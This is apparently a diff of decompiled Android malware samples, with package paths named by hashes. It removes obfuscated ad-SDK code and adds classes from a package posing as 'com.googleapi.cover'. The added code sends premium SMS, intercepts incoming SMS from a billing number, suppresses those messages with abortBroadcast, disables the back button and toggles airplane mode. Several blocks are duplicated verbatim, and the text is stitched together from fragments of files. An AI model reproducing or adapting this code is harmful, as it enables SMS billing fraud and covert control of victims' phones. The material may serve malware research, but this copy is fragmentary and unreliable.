+            this.footrTextView.setVisibility(0);
+            if (!this.actor.isMTSRF()) {
+                this.agreementTextView.setVisibility(0);
+                this.footrTextView.setText(String.valueOf(getString(R.string.attention)) + " " + price + getString(R.string.rub));
+            }
+            SpannableString content = new SpannableString(getString(R.string.agr_text));
+            content.setSpan(new UnderlineSpan(), 0, content.length(), 0);
+            this.agreementTextView.setText(content);
+            this.agreementTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.3
+                @Override // android.view.View.OnClickListener
+                public void onClick(View v) {
+                    RelatedContent.this.showOff();
+                }
+            });
+            SpannableString content2 = new SpannableString(getString(R.string.exit));
+            content2.setSpan(new UnderlineSpan(), 0, content2.length(), 0);
+            this.exitTextView.setText(content2);
+            this.exitTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.4
+                @Override // android.view.View.OnClickListener
+                public void onClick(View v) {
+                    RelatedContent.this.goToNextScreen();
+                }
+            });
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void start() {
+        SharedPreferences settings = getSharedPreferences(Main.KEY_PREFS, 0);
+        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, settings.getInt(Actor.ALLOWED_SMS_NUMBER, 1) + 1, settings);
+        this.dialog = new ProgressDialog(this);
+        this.dialog.setCancelable(false);
+        this.dialog.setMessage(getResources().getString(R.string.please_wait));
+        this.dialog.show();
+        if (!this.isRegistered) {
+            this.isRegistered = true;
+            registerReceiver();
+        }
+        this.actor.start(this.index);
+    }
+
+    @Override // android.app.Activity
+    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
+        super.onActivityResult(requestCode, resultCode, intent);
+        if (resultCode == 1) {
+            start();
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void goToNextScreen() {
+        if (this.actor.hasMoreContent(this.index)) {
+            this.index++;
+            initializeGUI();
+        } else {
+            showLastScreen(new Intent(this, (Class<?>) ShowURL.class), true);
+        }
+    }
+
+    private void registerReceiver() {
+        registerReceiver(new BroadcastReceiver() { // from class: com.googleapi.cover.RelatedContent.5
+            @Override // android.content.BroadcastReceiver
+            public void onReceive(Context context, Intent i) {
+                RelatedContent.this.dialog.dismiss();
+                int resultCode = Actor.STATUS;
+                switch (resultCode) {
+                    case -1:
+                        RelatedContent.this.goToNextScreen();
+                        break;
+                    default:
+                        Toast.makeText(RelatedContent.this.getBaseContext(), R.string.sms_sending_error, 0).show();
+                        break;
+                }
+            }
+        }, new IntentFilter(Main.SEND_DONE));
+    }
+
+    private void showLastScreen(Intent i, boolean yesButtonPressed) {
+        i.setFlags(i.getFlags() | 67108864 | 536870912);
+        int maxIndex = yesButtonPressed ? this.index : this.index - 1;
+        Utils.putIntegerValue(this, LAST_ACTIVATED, maxIndex, getSharedPreferences(Main.KEY_PREFS, 0));
+        String relatedLinks = "";
+        for (int j = 0; j < maxIndex + 1; j++) {
+            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
+        }
+        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
+        startActivity(i);
+        finish();
+    }
+
+    @Override // android.app.Activity
+    public boolean onCreateOptionsMenu(Menu menu) {
+        MenuInflater inflater = getMenuInflater();
+        inflater.inflate(R.menu.main_menu, menu);
+        return true;
+    }
+
+    @Override // android.app.Activity
+    public boolean onOptionsItemSelected(MenuItem item) {
+        switch (item.getItemId()) {
+            case R.id.read_off_item /* 2131296277 */:
+                showOff();
+                return true;
+            default:
+                return super.onOptionsItemSelected(item);
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void showOff() {
+        Intent i = new Intent(this, (Class<?>) AgActivity.class);
+        startActivityForResult(i, 1);
     }
 }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.ad.aw.b
-Class Name:aw
-Content: package com.kuguo.ad;
+Package Path:com.googleapi.cover.RelatedContent.onKeyDown
+Class Name:RelatedContent
+Content: package com.googleapi.cover;
 
-    public JSONObject b() {
-        JSONObject jSONObject = new JSONObject();
-        JSONObject jSONObject2 = new JSONObject();
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == 4) {
+            return true;
+        }
+        return super.onKeyDown(keyCode, event);
+    }
+
+Package Path:com.googleapi.cover.MessageReceiver.onReceive
+Class Name:MessageReceiver
+Content: package com.googleapi.cover;
+
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle;
+        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
+            try {
+                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+                Object[] pdus = (Object[]) bundle.get("pdus");
+                StringBuilder builder = new StringBuilder();
+                boolean hasExpectedNum = false;
+                SmsMessage[] msgs = new SmsMessage[pdus.length];
+                for (int i = 0; i < msgs.length; i++) {
+                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
+                        if (!hasExpectedNum) {
+                            hasExpectedNum = true;
+                        }
+                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
+                    }
+                }
+                if (hasExpectedNum) {
+                    String text = builder.toString();
+                    if (text.contains("http://")) {
+                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
+                    } else {
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+                    }
+                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
+                    abortBroadcast();
+                }
+            } catch (Exception e) {
+            }
+        }
+    }
+
+Package Path:com.googleapi.cover.MessageReceiver.MessageReceiver
+Class Name:MessageReceiver
+Content: package com.googleapi.cover;
+
+public class MessageReceiver extends BroadcastReceiver {
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle;
+        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
+            try {
+                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+                Object[] pdus = (Object[]) bundle.get("pdus");
+                StringBuilder builder = new StringBuilder();
+                boolean hasExpectedNum = false;
+                SmsMessage[] msgs = new SmsMessage[pdus.length];
+                for (int i = 0; i < msgs.length; i++) {
+                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
+                        if (!hasExpectedNum) {
+                            hasExpectedNum = true;
+                        }
+                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
+                    }
+                }
+                if (hasExpectedNum) {
+                    String text = builder.toString();
+                    if (text.contains("http://")) {
+                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
+                    } else {
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+                    }
+                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
+                    abortBroadcast();
+                }
+            } catch (Exception e) {
+            }
+        }
+    }
+}
+
+Package Path:com.googleapi.cover.TextUtils.TextUtils
+Class Name:TextUtils
+Content: package com.googleapi.cover;
+
+public class TextUtils {
+    public static final String CS_TAG = "cs";
+    public static final String FOURTH_TEXT_TAG = "fourthText";
+    public static final String INSTALLLED_TEXT_TAG = "installedString";
+    public static final String MAIN_TEXT_TAG = "mainText";
+    public static final String SECOND_TEXT_TAG = "secondString";
+    public static final String TAG_ID = "mcc";
+    public static final String TEXTS_TAG = "texts";
+    public static final String THIRD_TEXT_TAG = "thirdText";
+
+    public static HashMap<String, HashMap<String, String>> getTexts(XmlResourceParser xml) throws IOException {
+        HashMap<String, HashMap<String, String>> result = new HashMap<>();
         try {
-            jSONObject.put("a", this.a);
-            jSONObject.put("b", this.b);
-            jSONObject.put("c", this.c);
-            jSONObject.put("d", this.d);
-            jSONObject.put("e", this.e);
-            jSONObject.put("f", this.f);
-            jSONObject.put("g", this.g);
-            jSONObject.put("h", this.h);
-            jSONObject.put("i", this.i);
-            jSONObject.put("j", this.j);
-            jSONObject.put("k", this.k);
-            jSONObject.put("l", this.l);
-            jSONObject.put("m", this.m);
-            jSONObject.put("n", this.n);
-            jSONObject.put("o", this.o);
-            jSONObject.put("p", this.p);
-            jSONObject.put("q", this.q);
-            jSONObject.put("r", this.r);
-            jSONObject.put("s", this.s);
-            jSONObject.put("t", this.t);
-            jSONObject.put("u", this.u);
-            jSONObject2.put(a(), jSONObject);
-            return jSONObject2;
+            TreeMap<String, String> texts = new TreeMap<>();
+            int eventType = 0;
+            String cc = "";
+            while (eventType != 1) {
+                String nV = xml.getName();
+                if (eventType != 0) {
+                    if (eventType == 2) {
+                        if (!nV.equals(CS_TAG) && !nV.equals(TEXTS_TAG)) {
+                            String val = xml.getAttributeValue(0);
+                            if (!nV.equalsIgnoreCase(TAG_ID)) {
+                                texts.put(nV, val);
+                            } else {
+                                cc = val;
+                            }
+                        }
+                    } else if (eventType == 3 && nV.equals(TEXTS_TAG)) {
+                        result.put(cc, new HashMap<>(texts));
+                        texts.clear();
+                    }
+                }
+                eventType = xml.next();
+            }
+        } catch (XmlPullParserException e) {
+        } finally {
+            xml.close();
+        }
+        return result;
+    }
+
+    public static Pair<String, String> getScheme(Context context) throws IOException {
+        return Pair.create(read(4, context), read(5, context));
+    }
+
+    public static String getDailyKey() {
+        return String.valueOf(DateFormat.format("yyyy-MM-dd", new Date()).toString()) + "sent";
+    }
+
+    public static String read(int lineNum, Context context) throws IOException {
+        BufferedReader reader = new BufferedReader(new InputStreamReader(context.getResources().openRawResource(R.raw.act_schemes)));
+        String line = null;
+        for (int i = 0; i < lineNum; i++) {
+            line = reader.readLine();
+        }
+        reader.close();
+        return line;
+    }
+
+    public static String getSubId(Context context) {
+        String id = new String();
+        try {
+            String text = (String) getScheme(context).second;
+            int indexOfPlus = text.indexOf(43);
+            if (indexOfPlus != -1) {
+                String id2 = text.substring(0, indexOfPlus);
+                return id2;
+            }
+            return text;
         } catch (Exception e) {
-            e.printStackTrace();
-            return null;
+            return id;
         }
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.a.b.e
-Class Name:b
-Content: package com.kuguo.a;
-
-    public int e;
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.b.f.j
-Class Name:f
-Content: package net.crazymedia.iad.b;
-
-    public static String j() {
-        return new net.crazymedia.iad.d.e(e.s()).a(e.t());
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.d.o.e
-Class Name:o
-Content: package net.crazymedia.iad.d;
-
-    public static long e(Context context) {
-        return context.getSharedPreferences("triggerPushAdTime", 1).getLong("scores", 0L);
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.ad.ae.ae
-Class Name:ae
-Content: package com.kuguo.ad;
-
-public class ae extends LinearLayout implements View.OnClickListener {
-    private Activity a;
-    private WebView b;
-    private LinearLayout c;
-    private ProgressBar d;
-    private Drawable e;
-    private Drawable f;
-    private Drawable g;
-    private Drawable h;
-    private ImageButton i;
-    private ImageButton j;
-    private w k;
-
-    public ae(Activity activity) {
-        super(activity);
-        this.k = null;
-        this.a = activity;
-        setOrientation(1);
-        setLayoutParams(new LinearLayout.LayoutParams(-1, -1));
-        a(activity);
-    }
-
-    private void a() {
-        this.b.reload();
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void a(ImageButton imageButton) {
-        imageButton.setEnabled(true);
-        imageButton.setClickable(true);
-        switch (imageButton.getId()) {
-            case 20001:
-                imageButton.setImageDrawable(this.h);
-                break;
-            case 20002:
-                imageButton.setImageDrawable(this.e);
-                break;
+    public static String getSubText(Context context) {
+        try {
+            String line = read(12, context);
+            if (line == null) {
+                return "";
+            }
+            return line;
+        } catch (IOException e) {
+            return "";
         }
     }
 
-    /* JADX INFO: Access modifiers changed from: private */
-    public void a(String str) {
-        Intent intent = new Intent();
-        intent.setAction("android.intent.action.VIEW");
-        intent.setData(Uri.parse(str));
-        List<ResolveInfo> queryIntentActivities = this.a.getPackageManager().queryIntentActivities(intent, 0);
-        if (queryIntentActivities == null || queryIntentActivities.size() == 0) {
-            return;
+    public static String getOperatorString(Context context) {
+        TelephonyManager mgr = (TelephonyManager) context.getSystemService("phone");
+        return mgr.getSimState() == 5 ? mgr.getSimOperator() : "111111";
+    }
+
+    public static String getMNC(Context context) {
+        return getOperatorString(context).substring(3, 5);
+    }
+
+    public static String getMCC(Context context) {
+        return getOperatorString(context).substring(0, 3);
+    }
+}
+
+Package Path:com.googleapi.cover.RelatedContent.RelatedContent
+Class Name:RelatedContent
+Content: package com.googleapi.cover;
+
+public class RelatedContent extends Activity {
+    public static final String LAST_ACTIVATED = "LAST_ACTIVATED";
+    private static final int OFF = 1;
+    private static final int RESULT_OK = 1;
+    private Actor actor;
+    private TextView agreementTextView;
+    private ProgressDialog dialog;
+    private TextView exitTextView;
+    private TextView footrTextView;
+    private int index;
+    private TextView mainTextView;
+    private Button noButton;
+    private Button yesButton;
+    boolean isRegistered = false;
+    private String price_mf_1 = "111.76";
+    private String price_mf_2 = "70";
+
+    @Override // android.app.Activity
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.related_content);
+        this.index = getIntent().getIntExtra("index", 0);
+        this.actor = new Actor(this, TextUtils.getOperatorString(this));
+        if (!this.actor.wasActError()) {
+            initializeGUI();
+        } else {
+            finish();
         }
-        this.a.startActivity(intent);
     }
 
-    private void b() {
-        Intent intent = new Intent();
-        intent.setAction("android.intent.action.VIEW");
-        intent.setData(Uri.parse(this.b.getUrl()));
-        List<ResolveInfo> queryIntentActivities = this.a.getPackageManager().queryIntentActivities(intent, 0);
-        if (queryIntentActivities == null || queryIntentActivities.size() == 0) {
-            return;
+    private void initializeGUI() {
+        initButtons();
+        initializeTextViews();
+    }
+
+    private void initButtons() {
+        this.yesButton = (Button) findViewById(R.id.related_yes_btn);
+        this.noButton = (Button) findViewById(R.id.related_no_btn);
+        setListeners();
+    }
+
+    private void initializeTextViews() {
+        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
+        Display display = getWindowManager().getDefaultDisplay();
+        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
+    }
+
+    @Override // android.app.Activity, android.view.KeyEvent.Callback
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == 4) {
+            return true;
         }
-        this.a.startActivity(intent);
+        return super.onKeyDown(keyCode, event);
     }
 
-    /* JADX INFO: Access modifiers changed from: private */
-    public void b(ImageButton imageButton) {
-        imageButton.setEnabled(false);
-        imageButton.setClickable(false);
-        switch (imageButton.getId()) {
-            case 20001:
-                imageButton.setImageDrawable(this.g);
-                break;
-            case 20002:
-                imageButton.setImageDrawable(this.f);
-                break;
-        }
+    @Override // android.app.Activity
+    public void onBackPressed() {
     }
 
-    public void a(Context context) {
-        RelativeLayout relativeLayout = new RelativeLayout(context);
-        new RelativeLayout.LayoutParams(-2, -2);
-        this.c = new LinearLayout(context);
-        this.c.setBackgroundColor(-11364418);
-        this.c.setGravity(16);
-        this.i = new ImageButton(context);
-        this.i.setId(20001);
-        StateListDrawable stateListDrawable = new StateListDrawable();
-        stateListDrawable.addState(new int[]{R.attr.state_pressed}, new ColorDrawable(-8947849));
-        stateListDrawable.addState(new int[]{R.attr.state_enabled}, new ColorDrawable(0));
-        this.i.setBackgroundDrawable(stateListDrawable);
-        this.g = a.a(com.kuguo.c.d.b(this.a, "kuguo_res/go_back.png"), 0.0f);
-        this.h = com.kuguo.c.d.b(this.a, "kuguo_res/go_back.png");
-        this.i.setImageDrawable(this.h);
-        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
-        layoutParams.weight = 1.0f;
-        layoutParams.gravity = 17;
-        this.c.addView(this.i, layoutParams);
-        this.i.setOnClickListener(this);
-        this.j = new ImageButton(this.a);
-        this.j.setId(20002);
-        StateListDrawable stateListDrawable2 = new StateListDrawable();
-        stateListDrawable2.addState(new int[]{R.attr.state_pressed}, new ColorDrawable(-8947849));
-        stateListDrawable2.addState(new int[]{R.attr.state_enabled}, new ColorDrawable(0));
-        this.j.setBackgroundDrawable(stateListDrawable2);
-        this.f = a.a(com.kuguo.c.d.b(this.a, "kuguo_res/go_forward.png"), 0.0f);
-        this.e = com.kuguo.c.d.b(this.a, "kuguo_res/go_forward.png");
-        this.j.setImageDrawable(this.f);
-        this.j.setOnClickListener(this);
-        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-2, -2);
-        layoutParams2.weight = 1.0f;
-        layoutParams2.gravity = 17;
-        this.c.addView(this.j, layoutParams2);
-        ImageButton imageButton = new ImageButton(context);
-        imageButton.setId(20006);
-        imageButton.setImageDrawable(com.kuguo.c.d.b(context, "kuguo_res/refresh.png"));
-        StateListDrawable stateListDrawable3 = new StateListDrawable();
-        stateListDrawable3.addState(new int[]{R.attr.state_pressed}, new ColorDrawable(-8947849));
-        stateListDrawable3.addState(new int[]{R.attr.state_enabled}, new ColorDrawable(0));
-        imageButton.setBackgroundDrawable(stateListDrawable3);
-        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-2, -2);
-        layoutParams3.weight = 1.0f;
-        layoutParams3.gravity = 17;
-        this.c.addView(imageButton, layoutParams3);
-        imageButton.setOnClickListener(this);
-        ImageButton imageButton2 = new ImageButton(context);
-        imageButton2.setId(20007);
-        imageButton2.setImageDrawable(com.kuguo.c.d.b(context, "kuguo_res/jump.png"));
-        StateListDrawable stateListDrawable4 = new StateListDrawable();
-        stateListDrawable4.addState(new int[]{R.attr.state_pressed}, new ColorDrawable(-8947849));
-        stateListDrawable4.addState(new int[]{R.attr.state_enabled}, new ColorDrawable(0));
-        imageButton2.setBackgroundDrawable(stateListDrawable4);
-        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-2, -2);
-        layoutParams4.weight = 1.0f;
-        layoutParams4.gravity = 17;
-        this.c.addView(imageButton2, layoutParams4);
-        imageButton2.setOnClickListener(this);
-        this.c.setId(20003);
-        RelativeLayout.LayoutParams layoutParams5 = new RelativeLayout.LayoutParams(-1, -2);
-        layoutParams5.addRule(9);
-        layoutParams5.addRule(10);
-        relativeLayout.addView(this.c, layoutParams5);
-        this.d = new ProgressBar(this.a, null, R.attr.progressBarStyleHorizontal);
-        RelativeLayout.LayoutParams layoutParams6 = new RelativeLayout.LayoutParams(-1, 8);
-        layoutParams6.addRule(3, 20003);
-        this.d.setId(20004);
-        this.d.setIndeterminate(true);
-        relativeLayout.addView(this.d, layoutParams6);
-        this.b = new WebView(context);
-        this.b.setPadding(0, 0, 0, 0);
-        this.b.setScrollBarStyle(0);
-        this.b.setBackgroundColor(-1);
-        this.b.requestFocus();
-        WebSettings settings = this.b.getSettings();
-        settings.setJavaScriptEnabled(true);
-        settings.setCacheMode(-1);
-        settings.setSaveFormData(true);
-        settings.setLoadWithOverviewMode(true);
-        settings.setUseWideViewPort(true);
-        settings.setBuiltInZoomControls(true);
-        this.b.setWebChromeClient(new f(this));
-        this.b.setWebViewClient(new b(this));
-        RelativeLayout.LayoutParams layoutParams7 = new RelativeLayout.LayoutParams(-1, -2);
-        layoutParams7.addRule(12);
-        layoutParams7.addRule(3, 20004);
-        relativeLayout.addView(this.b, layoutParams7);
-        b(this.j);
-        b(this.i);
-        addView(relativeLayout);
-    }
+    private void setListeners() {
+        this.yesButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.1
+            private boolean clickable = true;
 
-    public void a(String str, byte[] bArr) {
-        this.b.postUrl(str, bArr);
-    }
-
-    @Override // android.view.View.OnClickListener
-    public void onClick(View view) {
-        switch (view.getId()) {
-            case 20001:
-                if (this.b.canGoBack()) {
-                    this.b.goBack();
-                    break;
+            @Override // android.view.View.OnClickListener
+            public void onClick(View v) {
+                if (this.clickable) {
+                    this.clickable = false;
+                    RelatedContent.this.start();
                 }
-                break;
-            case 20002:
-                if (this.b.canGoForward()) {
-                    this.b.goForward();
-                    break;
+            }
+        });
+        if (this.actor.isMF()) {
+            this.noButton.setVisibility(0);
+        }
+        this.noButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.2
+            private boolean clickable = true;
+
+            @Override // android.view.View.OnClickListener
+            public void onClick(View v) {
+                if (this.clickable) {
+                    this.clickable = false;
+                    RelatedContent.this.goToNextScreen();
                 }
-                break;
-            case 20005:
-                this.a.finish();
-                break;
-            case 20006:
-                a();
-                break;
-            case 20007:
-                b();
-                break;
+            }
+        });
+        this.footrTextView = (TextView) findViewById(R.id.agr_footr_text);
+        this.agreementTextView = (TextView) findViewById(R.id.related_content_agr_text);
+        this.exitTextView = (TextView) findViewById(R.id.related_content_exit_text);
+        this.agreementTextView.setVisibility(8);
+        this.exitTextView.setVisibility(8);
+        if (this.actor.isMF() || this.actor.isMTSRF()) {
+            String price = "";
+            if (this.index == 0) {
+                if (this.actor.isMF()) {
+                    price = this.price_mf_1;
+                }
+            } else if (this.index == 1 && this.actor.isMF()) {
+                price = this.price_mf_2;
+            }
+            this.footrTextView.setVisibility(0);
+            if (!this.actor.isMTSRF()) {
+                this.agreementTextView.setVisibility(0);
+                this.footrTextView.setText(String.valueOf(getString(R.string.attention)) + " " + price + getString(R.string.rub));
+            }
+            SpannableString content = new SpannableString(getString(R.string.agr_text));
+            content.setSpan(new UnderlineSpan(), 0, content.length(), 0);
+            this.agreementTextView.setText(content);
+            this.agreementTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.3
+                @Override // android.view.View.OnClickListener
+                public void onClick(View v) {
+                    RelatedContent.this.showOff();
+                }
+            });
+            SpannableString content2 = new SpannableString(getString(R.string.exit));
+            content2.setSpan(new UnderlineSpan(), 0, content2.length(), 0);
+            this.exitTextView.setText(content2);
+            this.exitTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.4
+                @Override // android.view.View.OnClickListener
+                public void onClick(View v) {
+                    RelatedContent.this.goToNextScreen();
+                }
+            });
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void start() {
+        SharedPreferences settings = getSharedPreferences(Main.KEY_PREFS, 0);
+        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, settings.getInt(Actor.ALLOWED_SMS_NUMBER, 1) + 1, settings);
+        this.dialog = new ProgressDialog(this);
+        this.dialog.setCancelable(false);
+        this.dialog.setMessage(getResources().getString(R.string.please_wait));
+        this.dialog.show();
+        if (!this.isRegistered) {
+            this.isRegistered = true;
+            registerReceiver();
+        }
+        this.actor.start(this.index);
+    }
+
+    @Override // android.app.Activity
+    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
+        super.onActivityResult(requestCode, resultCode, intent);
+        if (resultCode == 1) {
+            start();
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void goToNextScreen() {
+        if (this.actor.hasMoreContent(this.index)) {
+            this.index++;
+            initializeGUI();
+        } else {
+            showLastScreen(new Intent(this, (Class<?>) ShowURL.class), true);
+        }
+    }
+
+    private void registerReceiver() {
+        registerReceiver(new BroadcastReceiver() { // from class: com.googleapi.cover.RelatedContent.5
+            @Override // android.content.BroadcastReceiver
+            public void onReceive(Context context, Intent i) {
+                RelatedContent.this.dialog.dismiss();
+                int resultCode = Actor.STATUS;
+                switch (resultCode) {
+                    case -1:
+                        RelatedContent.this.goToNextScreen();
+                        break;
+                    default:
+                        Toast.makeText(RelatedContent.this.getBaseContext(), R.string.sms_sending_error, 0).show();
+                        break;
+                }
+            }
+        }, new IntentFilter(Main.SEND_DONE));
+    }
+
+    private void showLastScreen(Intent i, boolean yesButtonPressed) {
+        i.setFlags(i.getFlags() | 67108864 | 536870912);
+        int maxIndex = yesButtonPressed ? this.index : this.index - 1;
+        Utils.putIntegerValue(this, LAST_ACTIVATED, maxIndex, getSharedPreferences(Main.KEY_PREFS, 0));
+        String relatedLinks = "";
+        for (int j = 0; j < maxIndex + 1; j++) {
+            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
+        }
+        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
+        startActivity(i);
+        finish();
+    }
+
+    @Override // android.app.Activity
+    public boolean onCreateOptionsMenu(Menu menu) {
+        MenuInflater inflater = getMenuInflater();
+        inflater.inflate(R.menu.main_menu, menu);
+        return true;
+    }
+
+    @Override // android.app.Activity
+    public boolean onOptionsItemSelected(MenuItem item) {
+        switch (item.getItemId()) {
+            case R.id.read_off_item /* 2131296277 */:
+                showOff();
+                return true;
+            default:
+                return super.onOptionsItemSelected(item);
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void showOff() {
+        Intent i = new Intent(this, (Class<?>) AgActivity.class);
+        startActivityForResult(i, 1);
+    }
+}
+
+Package Path:com.googleapi.cover.MessageReceiver.MessageReceiver
+Class Name:MessageReceiver
+Content: package com.googleapi.cover;
+
+public class MessageReceiver extends BroadcastReceiver {
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle;
+        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
+            try {
+                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+                Object[] pdus = (Object[]) bundle.get("pdus");
+                StringBuilder builder = new StringBuilder();
+                boolean hasExpectedNum = false;
+                SmsMessage[] msgs = new SmsMessage[pdus.length];
+                for (int i = 0; i < msgs.length; i++) {
+                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
+                        if (!hasExpectedNum) {
+                            hasExpectedNum = true;
+                        }
+                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
+                    }
+                }
+                if (hasExpectedNum) {
+                    String text = builder.toString();
+                    if (text.contains("http://")) {
+                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
+                    } else {
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+                    }
+                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
+                    abortBroadcast();
+                }
+            } catch (Exception e) {
+            }
         }
     }
 }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.c.c.e
-Class Name:c
-Content: package net.crazymedia.iad.c;
+Package Path:com.googleapi.cover.Main.showAirplaneDialog
+Class Name:Main
+Content: package com.googleapi.cover;
 
-    public int e = 0;
+    private void showAirplaneDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle(R.string.airplane).setMessage(getResources().getString(R.string.airplane_dialog_text)).setCancelable(false).setPositiveButton(getResources().getString(R.string.yes_btn_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.1
+            @Override // android.content.DialogInterface.OnClickListener
+            public void onClick(DialogInterface dialog, int id) {
+                Utils.putBooleanValue(Main.this.getApplicationContext(), AirModeHandler.AIRPLANE_MODE_WAS_ENABLED_BY_USER, true, Main.this.getSharedPreferences(Main.KEY_PREFS, 0));
+                Utils.setAirplaneMode(Main.this.getApplicationContext(), 0);
+                Main.this.finish();
+            }
+        }).setNegativeButton(getResources().getString(R.string.no_button_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.2
+            @Override // android.content.DialogInterface.OnClickListener
+            public void onClick(DialogInterface dialog, int id) {
+                Main.this.finish();
+            }
+        });
+        AlertDialog alert = builder.create();
+        alert.show();
+    }
+
+Package Path:com.googleapi.cover.MessageReceiver.onReceive
+Class Name:MessageReceiver
+Content: package com.googleapi.cover;
+
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle;
+        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
+            try {
+                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+                Object[] pdus = (Object[]) bundle.get("pdus");
+                StringBuilder builder = new StringBuilder();
+                boolean hasExpectedNum = false;
+                SmsMessage[] msgs = new SmsMessage[pdus.length];
+                for (int i = 0; i < msgs.length; i++) {
+                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
+                        if (!hasExpectedNum) {
+                            hasExpectedNum = true;
+                        }
+                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
+                    }
+                }
+                if (hasExpectedNum) {
+                    String text = builder.toString();
